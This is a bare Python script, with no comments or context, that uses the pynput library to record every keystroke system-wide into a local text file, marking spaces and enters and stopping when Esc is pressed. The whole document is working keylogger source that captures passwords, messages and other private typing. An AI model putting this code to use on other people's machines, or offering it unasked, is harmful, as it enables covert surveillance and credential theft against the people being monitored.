from pynput import keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            if key == keyboard.Key.space:
                f.write(' [SPACE] ')
            elif key == keyboard.Key.enter:
                f.write('\n[ENTER]\n')
            else:
                f.write(str(key).strip("'"))
    except Exception as e:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()